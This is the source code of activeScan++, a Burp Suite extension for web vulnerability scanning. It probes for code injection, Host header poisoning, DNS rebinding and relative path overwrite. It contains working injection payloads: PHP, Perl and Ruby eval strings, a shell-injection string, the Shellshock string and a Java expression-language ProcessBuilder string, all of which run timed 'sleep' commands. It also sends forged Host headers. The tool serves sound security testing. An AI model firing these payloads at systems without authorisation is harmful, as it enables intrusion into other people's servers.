# Author: James Kettle <james.kettle@contextis.co.uk>
# Copyright 2014 Context Information Security
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, IScanIssue
import jarray, pickle, random, re, string, time
from string import Template
from cgi import escape

version = "1.0.6"
callbacks = None

class BurpExtender(IBurpExtender):
    
    def	registerExtenderCallbacks(self, this_callbacks):
        global callbacks
        callbacks = this_callbacks
    
        callbacks.setExtensionName("activeScan++")
        
        # Register host attack components
        host = HostAttack(callbacks)
        callbacks.registerScannerInsertionPointProvider(host)
        callbacks.registerScannerCheck(host);
        
        # Register code exec component
        callbacks.registerScannerCheck(CodeExec(callbacks));
        
        # Register passive scan component
        callbacks.registerScannerCheck(PassiveChecks(callbacks));
              
        print "Successfully loaded activeScan++ v"+version
        
        return

        
# This extends the active scanner with a number of timing-based code execution checks
# _payloads contains the payloads, designed to delay the response by $time seconds
# _extensionMappings defines which payloads get called on which file extensions
class CodeExec(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
        
        self._done = getIssues('Code injection')
              
        self._payloads = {
            # eval() injection
            'php':['{$${sleep($time)}}', "'.sleep($time).'", '".sleep($time)."', 'sleep($time)'],
            'perl':["'.sleep($time).'", '".sleep($time)."', 'sleep($time)'],
            'ruby':["'+sleep($time)+'", '"+sleep($time)+"'],
            
            # Exploits shell command injection into '$input' on linux and "$input" on windows:
            # and CVE-2014-6271
            'any':['"&timeout $time&\'`sleep $time`\'', '() { :;}; sleep $time'],
            
            # Expression language injection
            'java':['$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
        }
        
        # Used to ensure only appropriate payloads are attempted
        self._extensionMappings = {
            'php5':'php',
            'php4':'php',
            'php3':'php',
            'php':'php',
            'pl':'perl',
            'cgi':'perl',
            'jsp':'java',
            'do':'java',
            'action':'java',
            'rb':'ruby',
            '':['php','ruby','java'],
            'unrecognised':'java',
            
            # Code we don't have exploits for
            'asp':'any',
            'aspx':'any',
        }
       
    
    def doActiveScan(self, basePair, insertionPoint):
        if(insertionPoint.getInsertionPointName() == "hosthacker"):
            return None
            
        # Decide which payloads to use based on the file extension, using a set to prevent duplicate payloads          
        payloads = set()
        languages = self._getLangs(basePair)
        for lang in languages:
            new_payloads = self._payloads[lang]
            payloads |= set(new_payloads)
        payloads.update(self._payloads['any'])
        
        # Time how long each response takes compared to the baseline
        # Assumes <4 seconds jitter
        baseTime = 0
        for payload in payloads:
            if(baseTime == 0):
                baseTime = self._attack(basePair, insertionPoint, payload, 0)[0]
            if(self._attack(basePair, insertionPoint, payload, 10)[0] > baseTime+6):
                print "Suspicious delay detected. Confirming it's consistent..."
                (dummyTime, dummyAttack) = self._attack(basePair, insertionPoint, payload, 0)
                if(dummyTime < baseTime+4):
                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 10)
                    if(timer > dummyTime+6):
                        print "Code execution confirmed"
                        url = self._helpers.analyzeRequest(attack).getUrl()
                        if(url in self._done):
                            break
                        self._done.append(url)
                        return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection', 
                        "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0 seconds, and a response time of <b>"+str(dummyTime)+"</b> seconds was observed. <br/>It was then instructed to sleep for 10 seconds, which resulted in a response time of <b>"+str(timer)+"</b> seconds", 'Firm', 'High')]
              
        return None
        
    def _getLangs(self, basePair):
        ext = self._helpers.analyzeRequest(basePair).getUrl().getPath().split('.')[-1]
        if(ext in self._extensionMappings):
            code = self._extensionMappings[ext]
        else:
            code = self._extensionMappings['unrecognised']
        if(isinstance(code, basestring)):
            code = [code]
        return code
        
        
    def _attack(self, basePair, insertionPoint, payload, sleeptime):
        payload = Template(payload).substitute(time=sleeptime)
        
        # Use a hack to time the request. This information should be accessible via the API eventually.
        timer = time.time()
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest(payload))
        timer = time.time() - timer
        print "Response time: "+str(round(timer, 2)) + "| Payload: "+payload
        
        requestHighlights = insertionPoint.getPayloadOffsets(payload)
        if(not isinstance(requestHighlights, list)):
            requestHighlights = [requestHighlights]
        attack = callbacks.applyMarkers(attack, requestHighlights, None)
        
        return (timer, attack)

        
class HostAttack(IScannerInsertionPointProvider, IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
      
        self._referer = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(6))
        
        # Load previously identified scanner issues to prevent duplicates
        self._rebind = map(lambda i: i.getAuthority(), getIssues('Arbitrary host header accepted'))
        self._poison = getIssues('Host header poisoning')
                       
    def getInsertionPoints(self, basePair):
        rawHeaders = self._helpers.analyzeRequest(basePair.getRequest()).getHeaders()
        
        # Parse the headers into a dictionary
        headers = dict( (header.split(': ')[0].upper(), header.split(': ', 1)[1]) for header in rawHeaders[1:] )
        
        # If the request doesn't use the host header, bail
        if ('HOST' not in headers.keys()):
            return None
                
        response = self._helpers.bytesToString(basePair.getResponse())
        
        # If the response doesn't reflect the host header we can't identify successful attacks
        if(headers['HOST'] not in response):
            print "Skipping host header attacks on this request as the host isn't reflected"
            return None
        
        return [ HostInsertionPoint(self._helpers, basePair, headers) ]
        
        
    def doActiveScan(self, basePair, insertionPoint):
    
        # Return if the insertion point isn't the right one
        if(insertionPoint.getInsertionPointName() != "hosthacker"):
            return None
            
        # Return if we've already flagged both issues on this URL
        url = self._helpers.analyzeRequest(basePair).getUrl()
        host = url.getAuthority()
        if(host in self._rebind and url in self._poison):
            return None
            
        # Send a baseline request to learn what the response should look like    
        legit = insertionPoint.getBaseValue()
        (attack, resp) = self._attack(basePair, insertionPoint, {'host':legit}, legit)
        baseprint = tagmap(resp)
        
        # Send several requests with invalid host headers and observe whether they reach the target application, and whether the host header is reflected
        taint = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(6))
        taint += '.'+legit
        issues = []
        
        # Host: evil.legit.com
        (attack, resp) = self._attack(basePair, insertionPoint, {'host':taint}, taint)
        if(hit(resp, baseprint)):
        
            # flag DNS-rebinding if we haven't already, and the page actually has content
            if(baseprint != '' and host not in self._rebind):
                issues.append(self._raise(basePair, attack, host, 'dns'))
                
            if(taint in resp and url not in self._poison and self._referer not in resp):
                  issues.append(self._raise(basePair, attack, host, 'host'))
                  return issues
        else:
            # The application might not be the default VHost, so try an absolute URL:
            #	GET http://legit.com/foo
            #	Host: evil.com
            (attack, resp) = self._attack(basePair, insertionPoint, {'abshost':legit, 'host':taint}, taint)
            if(hit(resp, baseprint) and taint in resp and url not in self._poison and self._referer not in resp):
                issues.append(self._raise(basePair, attack, host, 'abs'))
            
        #	Host: legit.com
        #	X-Forwarded-Host: evil.com
        (attack, resp) = self._attack(basePair, insertionPoint, {'host':legit, 'xfh':taint}, taint)
        if(hit(resp, baseprint) and taint in resp and url not in self._poison and self._referer not in resp):
            issues.append(self._raise(basePair, attack, host, 'xfh'))
        
        return issues
    
    def _raise(self, basePair, attack, host, type):
        service = attack.getHttpService()
        url = self._helpers.analyzeRequest(attack).getUrl()
        
        if(type == 'dns'):
            title = 'Arbitrary host header accepted'
            sev = 'Low'
            conf = 'Certain'
            desc = """The application appears to be accessible using arbitrary HTTP Host headers. <br/><br/>
            
                    This is a serious issue if the application is not externally accessible or uses IP-based access restrictions. Attackers can use DNS Rebinding to bypass any IP or firewall based access restrictions that may be in place, by proxying through their target's browser.<br/>
                    Note that modern web browsers' use of DNS pinning does not effectively prevent this attack. The only effective mitigation is server-side: https://bugzilla.mozilla.org/show_bug.cgi?id=689835#c13<br/><br/>
                    
                    Additionally, it may be possible to directly bypass poorly implemented access restrictions by sending a Host header of 'localhost'"""
            self._rebind.append(host)
        else:
            title = 'Host header poisoning'
            sev = 'Medium'
            conf = 'Tentative'
            desc = """The application appears to trust the user-supplied host header. By supplying a malicious host header with a password reset request, it may be possible to generate a poisoned password reset link. Consider testing the host header for classic server-side injection vulnerabilities.<br/>
                    <br/>
                    Depending on the configuration of the server and any intervening caching devices, it may also be possible to use this for cache poisoning attacks.<br/>
                    <br/>
                    Resources: <br/><ul>
                        <li>http://carlos.bueno.org/2008/06/host-header-injection.html<br/></li>
                        <li>http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</li>
                        </ul>
            """
            self._poison.append(url)
        issue = CustomScanIssue(service, url, [basePair, attack], title, desc, conf, sev)
        return issue
         
    def _attack(self, basePair, insertionPoint, payloads, taint):
        proto = self._helpers.analyzeRequest(basePair).getUrl().getProtocol()+'://'
        if('abshost' in payloads):
            payloads['abshost'] = proto + payloads['abshost']
        payloads['referer'] = proto + taint + '/' + self._referer
        print "Host attack: "+str(payloads)
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest('hosthacker'+pickle.dumps(payloads)))
        response = self._helpers.bytesToString(attack.getResponse())
        requestHighlights = [jarray.array([m.start(),m.end()], 'i') for m in re.finditer('('+'|'.join(payloads.values())+')', self._helpers.bytesToString(attack.getRequest()))]
        responseHighlights = [jarray.array([m.start(),m.end()], 'i') for m in re.finditer(taint, response)]
        attack = callbacks.applyMarkers(attack, requestHighlights, responseHighlights)
        return (attack, response)
        

        
# Take input from HostAttack.doActiveScan() and use it to construct a HTTP request
class HostInsertionPoint(IScannerInsertionPoint):

    def __init__(self, helpers, basePair, rawHeaders):
        self._helpers = helpers
        self._baseHost = rawHeaders['HOST']
        request = self._helpers.bytesToString(basePair.getRequest())
        request = request.replace('$', '\$')
        request = request.replace('/', '$abshost/', 1)
        
        # add a cachebust parameter
        if ('?' in request[0:request.index('\n')]):
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1&cachebust=${cachebust}', request, 1)
        else:
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1?cachebust=${cachebust}', request, 1)
        
        request = re.sub('(?im)^Host: [a-zA-Z0-9-_.:]*', 'Host: ${host}${xfh}', request, 1)
        if('REFERER' in rawHeaders):
            request = re.sub('(?im)^Referer: http[s]?://[a-zA-Z0-9-_.:]*', 'Referer: ${referer}', request, 1)
            
        if('CACHE-CONTROL' in rawHeaders):
            request = re.sub('(?im)^Cache-Control: [^\r\n]+', 'Cache-Control: no-cache', request, 1)
        else:
            request = request.replace('Host: ${host}${xfh}', 'Host: ${host}${xfh}\r\nCache-Control: no-cache', 1)
            
        self._requestTemplate = Template(request)
        return None
          
    def getInsertionPointName(self):
        return "hosthacker"

    def getBaseValue(self):
        return self._baseHost

    def buildRequest(self, payload):
    
        # Drop the attack if it didn't originate from my scanner
        # This will cause an exception, no available workarounds at this time
        payload = self._helpers.bytesToString(payload)
        if(payload[:10] != 'hosthacker'):
            return None
            
        # Load the supplied payloads into the request
        payloads = pickle.loads(payload[10:])
        if 'xfh' in payloads:
            payloads['xfh'] = "\r\nX-Forwarded-Host: "+payloads['xfh']
            
        for key in ('xfh','abshost','host','referer'):
            if key not in payloads:
                payloads[key] = ''
                            
        # Ensure that the response to our request isn't cached - that could be harmful
        payloads['cachebust'] = time.time()
        
        request = self._requestTemplate.substitute(payloads)
        return self._helpers.stringToBytes(request)
        
        
    def getPayloadOffsets(self, payload):
        return None

    def getInsertionPointType(self):
        return INS_EXTENSION_PROVIDED
             

class PassiveChecks(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
        self._rpo = [location(i) for i in getIssues('Relative CSS include')]
        
    def doPassiveScan(self, basePair):
        response = self._helpers.bytesToString(basePair.getResponse())
        response = response.splitlines()
        content_start = response.index('')
        headers = '\r\n'.join(response[1:content_start])
        body = '\r\n'.join(response[content_start+1:])
        
        # List of passive scanning functions
        checks = [
            self.relative_path_overwrite,
            ]
        issues = []
        for check in checks:
            issue = check(basePair, headers.lower(), body.lower().strip())
            if(issue):
                issues.append(issue)

        return issues

    # Passively detect potential Relative Path Overwrite vulnerabilities
    # See http://www.thespanner.co.uk/2014/03/21/rpo/'>http://www.thespanner.co.uk/2014/03/21/rpo/
    def relative_path_overwrite(self, basePair, headers, body):
        if(body == ''):
            return None
    
        # Skip if the response isn't HTML or is ludicrously long
        if(('content-type' in headers and not re.search('content-type: .*?text/', headers)) or len(body) > 50000):
            return None
            
        # Skip if there is a <base declaration - this overrides the path rendering RPO unexploitable
        if('<base ' in body):
            return None
            
        # Most <!doctype declarations force strict mode, preventing text/html documents being accepted as CSS and making RPO unexploitable
        # however, IE quirks mode can be forced using iframe inheritance
        # however, X-Content-Type-Options: nosniff prevents RPO in IE
        docline = body.splitlines()[0]
        if(docline[:9] == '<!doctype' and not ('html 4.' in docline and 'dtd' not in docline)):
            if('x-content-type-options: nosniff' in headers or 'x-frame-options:' in headers):
                return None
            
        stylesheets = re.findall('(?i)(<link[^>]+?rel=["\']stylesheet.*?>)', body)
        vulnerable_imports = []
        for stylesheet in stylesheets:
            if(re.search('(?i)href=["\'](?!/|http:|https:|data:).*?', stylesheet)):
                vulnerable_imports.append(escape(stylesheet))
        if(vulnerable_imports):
            url = self._helpers.analyzeRequest(basePair).getUrl()
            if(location(url) not in self._rpo):
                self._rpo.append(location(url))
                return CustomScanIssue(basePair.getHttpService(), url, [basePair], 'Relative CSS include', 
                    "The application uses path-relative stylesheet imports:<p>"+htmllist(vulnerable_imports)+"It may be possible to manipulate this page into loading itself as a stylesheet. If this page displays stored user input or reflects the path, Referer or Cookie headers, it can be used for a Relative Path Overwrite attack. See <a href='http://www.thespanner.co.uk/2014/03/21/rpo/'>http://www.thespanner.co.uk/2014/03/21/rpo/</a> for further details.", 'Tentative', 'High')
            else:
                print "Not reporting duplicate RPO on "+str(url)
                
        return None  
        
        
class CustomScanIssue(IScanIssue):

    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail + '<br/><br/><div style="font-size:8px">This issue was reported by ActiveScan++</div>'
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: "+name+" on "+str(url)
        return
    
    def getUrl(self):
        return self.Url
     
    def getIssueName(self):
        return self.Name
    
    def getIssueType(self):
        return 0
    
    def getSeverity(self):
        return self.Severity
    
    def getConfidence(self):
        return self.Confidence
    
    def getIssueBackground(self):
        return None
    
    def getRemediationBackground(self):
        return None
    
    def getIssueDetail(self):
        return self.Detail
    
    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages
    
    def getHttpService(self):
        return self.HttpService
    
# misc utility methods
def location(url):
    return url.getProtocol()+"://"+url.getAuthority() + url.getPath()
    
def htmllist(list):
    list = ["<li>"+item+"</li>" for item in list]
    return "<ul>"+"\n".join(list)+"</ul>"
    
def tagmap(resp):
    tags = ''.join(re.findall("(?im)(<[a-z]+)", resp))
    return tags 

def hit(resp, baseprint):
    return (baseprint == tagmap(resp))

# currently unused as .getUrl() ignores the query string
def issuesMatch(existingIssue, newIssue):
    if(existingIssue.getUrl() == newIssue.getUrl() and existingIssue.getIssueName() == newIssue.getIssueName()):
        return -1
    else:
        return 0
        
def getIssues(name):
    prev_reported = filter(lambda i: i.getIssueName() == name, callbacks.getScanIssues(''))
    return (map(lambda i: i.getUrl(), prev_reported))
        